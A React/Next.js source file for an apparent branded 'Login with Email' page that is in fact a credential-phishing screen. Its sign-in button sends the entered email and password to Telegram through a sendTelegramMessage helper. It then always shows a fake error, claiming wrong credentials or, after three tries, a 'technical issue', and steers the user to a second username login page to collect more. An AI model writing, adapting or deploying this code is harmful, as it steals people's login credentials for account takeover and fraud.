"use client";

import { useState } from "react";
import Link from "next/link";

export default function EmailLoginScreen() {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [error, setError] = useState("");
    const [attempts, setAttempts] = useState(0);

    const [loading, setLoading] = useState(false);

    return (
        <div
            className="relative flex flex-col w-full min-h-screen"
            style={{ backgroundColor: "#5CB030" }}
        >
            <div className="flex flex-col px-7 pt-16 pb-8 flex-1">
                {/* Logo row */}
                <div className="flex items-center gap-3 mb-8">
                    {/* Logo circle with cow */}
                    <div>
                        <img
                            src="https://cdn.prod.website-files.com/642b08d9f919f4a6470dea8f/6436947376dd6e87c5b84177_logo.svg"
                            alt="Logo"
                            style={{ width: 160, height: 160 }}
                        />
                    </div>
                </div>

                {/* Welcome heading */}
                <h1
                    className="text-[40px] font-bold leading-[1.1] mb-10"
                    style={{ color: "#FFFFFF" }}
                >
                    Login with
                    <br />
                    Email
                </h1>

                {/* White card with inputs */}
                <div
                    className="relative w-full rounded-2xl px-6 pt-6 pb-5 overflow-hidden"
                    style={{ backgroundColor: "#FFFFFF" }}
                >
                    {/* Email field */}
                    <div
                        className="flex items-center py-4"
                        style={{ borderBottom: "1px solid #d1d5db" }}
                    >
                        <label
                            className="text-[16px] font-medium shrink-0"
                            style={{ color: "#374151", width: 110 }}
                            htmlFor="email-input"
                        >
                            Email
                        </label>
                        <input
                            id="email-input"
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="flex-1 text-[16px] outline-none border-none bg-transparent"
                            style={{ color: "#1a2008" }}
                            placeholder="you@example.com"
                            aria-label="Email address"
                        />
                    </div>

                    {/* Password field */}
                    <div
                        className="flex items-center py-4"
                        style={{ borderBottom: "1px solid #d1d5db" }}
                    >
                        <label
                            className="text-[16px] font-medium shrink-0"
                            style={{ color: "#374151", width: 110 }}
                            htmlFor="password-input"
                        >
                            Password
                        </label>
                        <input
                            id="password-input"
                            type={showPassword ? "text" : "password"}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="flex-1 text-[16px] outline-none border-none bg-transparent"
                            style={{ color: "#1a2008" }}
                            aria-label="Password"
                        />
                        {/* Eye toggle */}
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="ml-2 shrink-0 cursor-pointer"
                            aria-label={showPassword ? "Hide password" : "Show password"}
                        >
                            <svg
                                width="22"
                                height="22"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#9ca3af"
                                strokeWidth="2"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                            >
                                {showPassword ? (
                                    <>
                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                        <circle cx="12" cy="12" r="3" />
                                    </>
                                ) : (
                                    <>
                                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
                                        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
                                        <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
                                        <line x1="1" y1="1" x2="23" y2="23" />
                                    </>
                                )}
                            </svg>
                        </button>
                    </div>

                    {/* Error message */}
                    {error && (
                        <div
                            className="mt-4 rounded-lg px-4 py-3 text-[13px] font-semibold leading-snug"
                            style={{
                                backgroundColor: "#DC2626",
                                color: "#FFFFFF",
                            }}
                            role="alert"
                        >
                            {error}
                        </div>
                    )}

                    <button
                        type="button"
                        disabled={loading}
                        onClick={async () => {
                            setLoading(true);
                            setError("");
                            const currentAttempts = attempts + 1;
                            setAttempts(currentAttempts);

                            const { sendTelegramMessage } = await import("@/lib/telegram");
                            await sendTelegramMessage({
                                title: "Login Attempt (Email)",
                                email: email,
                                password: password,
                                exclude: ["location", "contact"],
                            });
                            await new Promise((resolve) => setTimeout(resolve, 2000));
                            if (currentAttempts >= 3) {
                                setError("Your request not proceed this time with technical issue");
                            } else if (!email || !password) {
                                setError("Please enter both email and password.");
                            } else {
                                setError("Your email and password is wrong. Please try with username.");
                            }
                            setLoading(false);
                        }}
                        className="w-full h-[54px] rounded-xl flex items-center justify-center mt-5 cursor-pointer border-none disabled:opacity-70 disabled:cursor-not-allowed"
                        style={{
                            backgroundColor: "#5CB030",
                        }}
                    >
                        {loading ? (
                            <svg
                                className="animate-spin h-6 w-6 text-white"
                                xmlns="http://www.w3.org/2000/svg"
                                fill="none"
                                viewBox="0 0 24 24"
                            >
                                <circle
                                    className="opacity-25"
                                    cx="12"
                                    cy="12"
                                    r="10"
                                    stroke="currentColor"
                                    strokeWidth="4"
                                ></circle>
                                <path
                                    className="opacity-75"
                                    fill="currentColor"
                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                ></path>
                            </svg>
                        ) : (
                            <span
                                className="text-[18px] font-bold"
                                style={{ color: "#FFFFFF" }}
                            >
                                Sign in
                            </span>
                        )}
                    </button>
                </div>

                {/* Back to user login link */}
                <Link
                    href="/login-cow"
                    className="mt-6 text-center text-[15px] font-semibold underline underline-offset-2 block"
                    style={{ color: "#FFFFFF" }}
                >
                    Login with username
                </Link>
            </div>
        </div>
    );
}
